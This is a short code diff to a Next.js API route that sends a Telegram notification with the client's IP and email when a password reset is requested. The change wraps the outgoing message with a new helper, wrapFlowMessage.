@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { sendTelegramMessage, getSiteName } from '@/lib/telegram';
+import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';
 
 function getClientIp(request) {
   const forwarded = request.headers.get('x-forwarded-for');
@@ -41,7 +41,7 @@ export async function POST(request) {
     if (email) lines.push(`📧 Email: ${escapeHtml(email)}`);
     const message = lines.join('\n');
 
-    await sendTelegramMessage(message);
+    await sendTelegramMessage(wrapFlowMessage(message));
     return NextResponse.json({ ok: true });
   } catch (err) {
     console.error('notify-forgot-password:', err);
